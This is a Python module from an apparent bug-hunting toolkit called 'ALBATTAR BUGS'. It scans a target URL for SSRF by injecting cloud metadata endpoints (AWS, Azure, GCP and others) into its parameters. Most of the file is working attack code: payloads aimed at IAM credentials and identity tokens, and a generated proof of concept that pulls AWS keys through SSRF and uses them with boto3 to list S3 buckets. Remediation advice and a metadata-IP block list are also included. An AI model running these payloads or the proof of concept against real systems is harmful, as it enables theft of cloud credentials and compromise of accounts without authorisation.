"""
╔══════════════════════════════════════════════════════════════╗
║    ⚔️  ALBATTAR BUGS - Cloud Metadata SSRF Scanner  ⚔️      ║
║              Created by ROBIN | @ll bUg                     ║
╚══════════════════════════════════════════════════════════════╝

Cloud Metadata SSRF Scanner
---------------------------
يكتشف SSRF للوصول إلى Cloud Metadata:
- AWS (EC2, Lambda, ECS)
- Azure (IMDS)
- Google Cloud Platform
- DigitalOcean
- Alibaba Cloud
"""

import re
import time
from typing import List, Dict, Any
import requests

from core.base_scanner import BaseScanner
from core.http_handler import HTTPHandler
from utils.logger import Logger
from utils.colors import Colors


class CloudMetadataSSRFScanner(BaseScanner):
    """
    ماسح Cloud Metadata SSRF
    """
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        self.name = "Cloud Metadata SSRF Scanner"
        self.description = "Detects SSRF to cloud metadata services"
        self.severity = "CRITICAL"
        
        self.logger = Logger(__name__)
        self.colors = Colors()
        self.http_handler = HTTPHandler(config)
        
        # Cloud metadata endpoints
        self.cloud_endpoints = self._load_cloud_endpoints()
        
        # Results
        self.vulnerabilities = []
        
        # Stats
        self.stats = {
            'total_tests': 0,
            'cloud_access_found': 0
        }
    
    def _load_cloud_endpoints(self) -> Dict[str, List[Dict]]:
        """تحميل Cloud metadata endpoints"""
        return {
            "aws": [
                {
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "signature": "ami-id",
                    "description": "AWS EC2 Metadata (IMDSv1)",
                    "severity": "CRITICAL",
                    "data_exposed": ["IAM credentials", "Instance info", "User data"]
                },
                {
                    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "signature": "",
                    "description": "AWS IAM Role Credentials",
                    "severity": "CRITICAL","data_exposed": ["Access Key", "Secret Key", "Session Token"]
                },
                {
                    "url": "http://169.254.169.254/latest/user-data/",
                    "signature": "",
                    "description": "AWS EC2 User Data",
                    "severity": "HIGH",
                    "data_exposed": ["Bootstrap scripts", "Secrets", "Configuration"]
                },
                {
                    "url": "http://169.254.169.254/latest/dynamic/instance-identity/document",
                    "signature": "instanceId",
                    "description": "AWS Instance Identity",
                    "severity": "MEDIUM",
                    "data_exposed": ["Instance details", "Account ID", "Region"]
                }
            ],
            "azure": [
                {
                    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    "signature": "compute",
                    "description": "Azure Instance Metadata Service",
                    "severity": "CRITICAL",
                    "headers": {"Metadata": "true"},
                    "data_exposed": ["VM info", "Network config", "Tags"]
                },
                {
                    "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                    "signature": "access_token",
                    "description": "Azure Managed Identity Token",
                    "severity": "CRITICAL",
                    "headers": {"Metadata": "true"},
                    "data_exposed": ["Access tokens", "Service principal credentials"]
                }
            ],
            "gcp": [
                {
                    "url": "http://metadata.google.internal/computeMetadata/v1/",
                    "signature": "project",
                    "description": "GCP Metadata Server",
                    "severity": "CRITICAL",
                    "headers": {"Metadata-Flavor": "Google"},
                    "data_exposed": ["Project info", "Instance attributes"]
                },
                {
                    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    "signature": "access_token",
                    "description": "GCP Service Account Token",
                    "severity": "CRITICAL",
                    "headers": {"Metadata-Flavor": "Google"},
                    "data_exposed": ["OAuth tokens", "Service account credentials"]
                },
                {
                    "url": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
                    "signature": "ssh-rsa",
                    "description": "GCP SSH Keys",
                    "severity": "HIGH",
                    "headers": {"Metadata-Flavor": "Google"},
                    "data_exposed": ["SSH public keys"]
                }
            ],
            "digitalocean": [
                {
                    "url": "http://169.254.169.254/metadata/v1.json",
                    "signature": "droplet_id",
                    "description": "DigitalOcean Metadata",
                    "severity": "HIGH",
                    "data_exposed": ["Droplet info", "Network config"]
                }
            ],
            "alibaba": [
                {
                    "url": "http://100.100.100.200/latest/meta-data/",
                    "signature": "instance-id",
                    "description": "Alibaba Cloud Metadata",
                    "severity": "HIGH",
                    "data_exposed": ["Instance info", "RAM role"]
                }
            ],
            "oracle": [
                {
                    "url": "http://169.254.169.254/opc/v1/instance/",
                    "signature": "id",
                    "description": "Oracle Cloud Metadata",
                    "severity": "HIGH",
                    "data_exposed": ["Instance details"]
                }
            ]
        }
    
    def scan(self) -> List[Dict]:
        """
        بدء فحص Cloud Metadata SSRF
        """
        self.logger.info(
            f"{self.colors.BLUE}Starting Cloud Metadata SSRF scan on {self.target}{self.colors.RESET}"
        )
        
        try:
            # Test all cloud providers
            for cloud_provider in self.cloud_endpoints.keys():
                self._test_cloud_provider(cloud_provider)
            
            self.logger.info(
                f"{self.colors.GREEN}Cloud Metadata SSRF scan complete. "
                f"Found {len(self.vulnerabilities)} vulnerabilities{self.colors.RESET}"
            )
            
        except Exception as e:
            self.logger.error(f"Error during Cloud Metadata SSRF scan: {str(e)}")
        
        return self.vulnerabilities
    
    def _test_cloud_provider(self, provider: str):
        """اختبار cloud provider معين"""
        self.logger.info(f"Testing {provider.upper()} metadata endpoints...")
        
        params = self._extract_parameters()
        
        if not params:
            self.logger.warning("No parameters found in URL")
            return
        
        endpoints = self.cloud_endpoints.get(provider, [])
        
        for param in params:
            for endpoint_data in endpoints:
                self._test_cloud_endpoint(param, provider, endpoint_data)
                time.sleep(0.3)
    
    def _test_cloud_endpoint(self, param: str, provider: str, endpoint_data: Dict):
        """اختبار cloud endpoint معين"""
        try:
            payload = endpoint_data["url"]
            test_url = self._build_test_url(param, payload)
            
            # Prepare headers if needed
            headers = endpoint_data.get("headers", {})
            
            # Send request
            response = self.http_handler.get(test_url, headers=headers, timeout=10)
            self.stats['total_tests'] += 1
            
            if response and response.status_code == 200:
                # Check for signature
                signature = endpoint_data.get("signature", "")
                
                if signature and signature in response.text:
                    self._report_vulnerability(
                        param=param,
                        payload=payload,
                        response=response,
                        cloud_provider=provider,
                        endpoint_data=endpoint_data
                    )
                    self.stats['cloud_access_found'] += 1
                
                # Check for sensitive patterns even without signature
                elif self._contains_sensitive_data(response.text):
                    self._report_vulnerability(
                        param=param,
                        payload=payload,
                        response=response,
                        cloud_provider=provider,
                        endpoint_data=endpoint_data
                    )
                    self.stats['cloud_access_found'] += 1
                    
        except Exception as e:
            self.logger.debug(f"Error testing cloud endpoint: {str(e)}")
    
    def _contains_sensitive_data(self, text: str) -> bool:
        """التحقق من وجود بيانات حساسة"""
        sensitive_patterns = [
            r'[A-Z0-9]{20}',  # AWS Access Key
            r'[A-Za-z0-9/+=]{40}',  # AWS Secret Key
            r'"access_token"',  # OAuth tokens
            r'"AccessKeyId"',
            r'"SecretAccessKey"',
            r'"Token"',
            r'ssh-rsa',  # SSH keys
            r'BEGIN RSA PRIVATE KEY',
            r'instanceId',
            r'droplet_id',
            r'project_id'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, text):
                return True
        
        return False
    
    def _extract_parameters(self) -> List[str]:
        """استخراج Parameters من URL"""
        params = []
        
        if "?" in self.target:
            query_string = self.target.split("?")[1]
            for param_pair in query_string.split("&"):
                if "=" in param_pair:
                    param_name = param_pair.split("=")[0]
                    params.append(param_name)
        
        return params
    
    def _build_test_url(self, param: str, payload: str) -> str:
        """بناء URL الاختبار"""
        if "?" not in self.target:
            return f"{self.target}?{param}={payload}"
        
        base_url = self.target.split("?")[0]
        query_params = []
        
        for param_pair in self.target.split("?")[1].split("&"):
            if "=" in param_pair:
                param_name, param_value = param_pair.split("=", 1)
                if param_name == param:
                    query_params.append(f"{param_name}={payload}")
                else:
                    query_params.append(param_pair)
        
        return f"{base_url}?{'&'.join(query_params)}"
    
    def _report_vulnerability(self, **kwargs):
        """تسجيل ثغرة مكتشفة"""
        
        endpoint_data = kwargs.get('endpoint_data', {})
        
        vulnerability = {
            "type": "Cloud Metadata SSRF",
            "severity": endpoint_data.get('severity', 'CRITICAL'),
            "url": self.target,
            "cloud_provider": kwargs.get('cloud_provider', 'Unknown').upper(),
            "endpoint": endpoint_data.get('description', 'Unknown'),
            "param": kwargs.get('param'),
            "payload": kwargs.get('payload'),
            "data_exposed": endpoint_data.get('data_exposed', []),
            "confidence": 98,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "cvss_score": 9.8,
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery"
        }
        
        # Add response details
        if 'response' in kwargs and kwargs['response']:
            response = kwargs['response']
            vulnerability['response_details'] = {
                'status_code': response.status_code,
                'length': len(response.text),
                'response_snippet': response.text[:500]
            }
        
        # Add exploitation guide
        vulnerability['exploitation'] = self._generate_exploitation_guide(vulnerability)
        
        # Add remediation
        vulnerability['remediation'] = self._generate_remediation()
        
        # Add impact assessment
        vulnerability['impact'] = self._assess_impact(vulnerability)
        
        self.vulnerabilities.append(vulnerability)
        
        self.logger.warning(
            f"{self.colors.RED}[CRITICAL] Cloud Metadata SSRF Found!{self.colors.RESET}\n"
            f"  Provider: {vulnerability['cloud_provider']}\n"
            f"  Endpoint: {vulnerability['endpoint']}\n"
            f"  Parameter: {vulnerability['param']}\n"
            f"  Data Exposed: {', '.join(vulnerability['data_exposed'])}"
        )
    
    def _generate_exploitation_guide(self, vuln: Dict) -> Dict:
        """توليد دليل الاستغلال"""
        
        provider = vuln['cloud_provider']
        
        guide = {
            "difficulty": "Easy",
            "requirements": [
                "SSRF vulnerability",
                "Target running on cloud infrastructure",
                f"Access to {provider} metadata service"
            ],
            "steps": [],
            "attack_scenarios": []
        }
        
        if provider == "AWS":
            guide["steps"] = [
                "1. Exploit SSRF to access http://169.254.169.254",
                "2. Enumerate IAM roles: /latest/meta-data/iam/security-credentials/",
                "3. Retrieve temporary credentials (AccessKeyId, SecretAccessKey, Token)",
                "4. Use credentials with AWS CLI/SDK",
                "5. Escalate privileges within AWS account"
            ]
            guide["attack_scenarios"] = [
                "Steal AWS credentials",
                "Access S3 buckets",
                "Enumerate AWS resources",
                "Pivot to other AWS services",
                "Exfiltrate sensitive data",
                "Launch instances, modify security groups"
            ]
            guide["poc_code"] = f"""
# AWS Metadata SSRF Exploitation
# Step 1: Get IAM role name
url = "{vuln['url'].split('?')[0]}?{vuln['param']}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
response = requests.get(url)
role_name = response.text.strip()

# Step 2: Get credentials
url = f"{{base_url}}?{vuln['param']}=http://169.254.169.254/latest/meta-data/iam/security-credentials/{{role_name}}"
response = requests.get(url)
creds = response.json()

# Step 3: Use credentials
import boto3
session = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['Token']
)

# Step 4: Enumerate resources
s3 = session.client('s3')
buckets = s3.list_buckets()
print(buckets)
"""
        
        elif provider == "AZURE":
            guide["steps"] = [
                "1. Exploit SSRF with Metadata: true header",
                "2. Access http://169.254.169.254/metadata/...",
                "3. Retrieve managed identity token",
                "4. Use token to access Azure resources",
                "5. Escalate privileges"
            ]
            guide["attack_scenarios"] = [
                "Steal managed identity tokens",
                "Access Azure resources",
                "Read secrets from Key Vault",
                "Access storage accounts",
                "Enumerate subscriptions"
            ]
        
        elif provider == "GCP":
            guide["steps"] = [
                "1. Exploit SSRF with Metadata-Flavor: Google header",
                "2. Access http://metadata.google.internal/...",
                "3. Retrieve service account token",
                "4. Use token with GCP APIs",
                "5. Access cloud resources"
            ]
            guide["attack_scenarios"] = [
                "Steal service account tokens",
                "Access GCS buckets",
                "Read secrets",
                "Enumerate projects",
                "Access compute instances"
            ]
        
        return guide
    
    def _generate_remediation(self) -> Dict:
        """توليد توصيات الإصلاح"""
        
        return {
            "priority": "CRITICAL",
            "immediate_actions": [
                "Block access to 169.254.169.254 in application firewall",
                "Rotate all exposed credentials immediately",
                "Review CloudTrail/Azure Monitor logs for unauthorized access",
                "Implement IMDSv2 (AWS) or equivalent protections"
            ],
            "recommendations": [
                "Implement strict URL validation and allowlisting",
                "Block private IP ranges in application",
                "Use IMDSv2 with session tokens (AWS)",
                "Require Metadata headers (Azure, GCP)",
                "Implement network segmentation",
                "Use instance profiles/managed identities with minimal permissions",
                "Monitor metadata access patterns",
                "Implement egress filtering"
            ],
            "cloud_specific": {
                "AWS": [
                    "Enable IMDSv2 (requires token)",
                    "Use iptables to restrict metadata access",
                    "Implement least privilege IAM policies",
                    "Enable CloudTrail logging"
                ],
                "Azure": [
                    "Require Metadata: true header",
                    "Use managed identities with minimal scope",
                    "Enable Azure Monitor alerts"
                ],
                "GCP": [
                    "Require Metadata-Flavor: Google header",
                    "Use service accounts with minimal permissions",
                    "Enable VPC Service Controls"
                ]
            },
            "code_examples": {
                "vulnerable": """
# ❌ VULNERABLE CODE
def fetch_url(url):
    response = requests.get(url)
    return response.text
""",
                "secure": """
# ✅ SECURE CODE
BLOCKED_IPS = [
    '169.254.169.254',  # AWS/Azure metadata
    '169.254.169.253',  # AWS DNS
    '100.100.100.200',  # Alibaba metadata
]

BLOCKED_HOSTS = [
    'metadata.google.internal',
    'metadata',
]

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Block metadata IPs
    if parsed.hostname in BLOCKED_IPS:
        return False
    
    # Block metadata hostnames
    if parsed.hostname in BLOCKED_HOSTS:
        return False
    
    # Resolve and check IP
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ip in BLOCKED_IPS:
            return False
        if ip.startswith('169.254.') or ip.startswith('100.100.'):
            return False
    except:
        return False
    
    return True

def fetch_url(url):
    if not is_safe_url(url):
        raise ValueError("Blocked metadata access attempt")
    
    response = requests.get(url, timeout=5)
    return response.text
"""
            },
            "references": [
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
                "https://docs.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service",
                "https://cloud.google.com/compute/docs/metadata/overview",
                "https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650"
            ]
        }
    
    def _assess_impact(self, vuln: Dict) -> Dict:
        """تقييم تأثير الثغرة"""
        
        provider = vuln['cloud_provider']
        
        return {
            "confidentiality": "CRITICAL",
            "integrity": "HIGH",
            "availability": "HIGH",
            "scope": "Changed",
            "description": (
                f"SSRF access to {provider} cloud metadata service allows attackers "
                f"to steal cloud credentials, access sensitive data, and potentially "
                f"compromise the entire cloud infrastructure. Exposed data includes: "
                f"{', '.join(vuln['data_exposed'])}."
            ),
            "business_impact": [
                f"Complete {provider} account compromise",
                "Theft of cloud credentials and secrets",
                "Unauthorized access to cloud resources",
                "Data exfiltration from cloud storage",
                "Resource manipulation (instances, storage, etc)",
                "Financial impact from unauthorized resource usage",
                "Compliance violations (GDPR, PCI-DSS, etc)",
                "Potential lateral movement to other systems"
            ],
            "real_world_examples": [
                "Capital One breach (2019) - SSRF to AWS metadata",
                "Shopify bug bounty - GCP metadata access",
                "Multiple Azure metadata exposures"
            ],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvss_breakdown": {
                "Attack Vector": "Network (AV:N)",
                "Attack Complexity": "Low (AC:L)",
                "Privileges Required": "None (PR:N)",
                "User Interaction": "None (UI:N)",
                "Scope": "Changed (S:C)",
                "Confidentiality": "High (C:H)",
                "Integrity": "High (I:H)",
                "Availability": "High (A:H)"
            }
        }
    
    def generate_report(self) -> Dict:
        """توليد تقرير شامل"""
        
        return {
            "scanner": self.name,
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "statistics": self.stats,
            "summary": self._generate_summary(),
            "recommendations": self._generate_general_recommendations()
        }
    
    def _generate_summary(self) -> str:
        """توليد ملخص الفحص"""
        
        if not self.vulnerabilities:
            return "No cloud metadata SSRF vulnerabilities detected."
        
        summary = f"""
Cloud Metadata SSRF Scan Summary:
----------------------------------
Total Vulnerabilities: {len(self.vulnerabilities)}

CRITICAL FINDINGS:
"""
        
        for vuln in self.vulnerabilities:
            summary += f"\n• {vuln['cloud_provider']} - {vuln['endpoint']}"
            summary += f"\n  Parameter: {vuln['param']}"
            summary += f"\n  Data Exposed: {', '.join(vuln['data_exposed'])}"
            summary += "\n"
        
        return summary
    
    def _generate_general_recommendations(self) -> List[str]:
        """توليد توصيات عامة"""
        
        return [
            "1. IMMEDIATELY rotate all exposed cloud credentials",
            "2. Block access to 169.254.169.254 and metadata.google.internal",
            "3. Implement strict URL validation with allowlists",
            "4. Enable IMDSv2 (AWS) / Metadata headers (Azure, GCP)",
            "5. Use instance profiles/managed identities with minimal permissions",
            "6. Implement network segmentation and egress filtering",
            "7. Monitor cloud API access for anomalies",
            "8. Enable CloudTrail/Azure Monitor/GCP Cloud Logging",
            "9. Regular security audits of cloud configurations",
            "10. Implement defense in depth for SSRF prevention"
        ]


# ═══════════════════════════════════════════════════════════════
#                          USAGE EXAMPLE
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    مثال على الاستخدام
    """
    
    config = {
        "timeout": 10,
        "user_agent": "AlBaTTaR-BUGS/1.0 (Cloud SSRF Scanner)"
    }
    
    target = "https://example.com/fetch?url=https://google.com"
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║      ⚔️  ALBATTAR BUGS - Cloud Metadata SSRF Scanner  ⚔️    ║
║                Created by ROBIN | @ll bUg                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    scanner = CloudMetadataSSRFScanner(target, config)
    
    print(f"\n[*] Starting Cloud Metadata SSRF scan on: {target}\n")
    vulnerabilities = scanner.scan()
    
    report = scanner.generate_report()
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n{Colors.RED}[CRITICAL] Found {len(vulnerabilities)} Cloud Metadata SSRF vulnerabilities!{Colors.RESET}\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{i}. {vuln['cloud_provider']} - {vuln['endpoint']}")
            print(f"   Severity: {vuln['severity']}")
            print(f"   Data Exposed: {', '.join(vuln['data_exposed'])}")
            print()
    else:
        print(f"\n{Colors.GREEN}[✓] No Cloud Metadata SSRF vulnerabilities found{Colors.RESET}\n")
    
    print(report['summary'])
    
    # Save report
    import json
    with open('cloud_ssrf_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n{Colors.GREEN}[✓] Report saved to: cloud_ssrf_report.json{Colors.RESET}\n")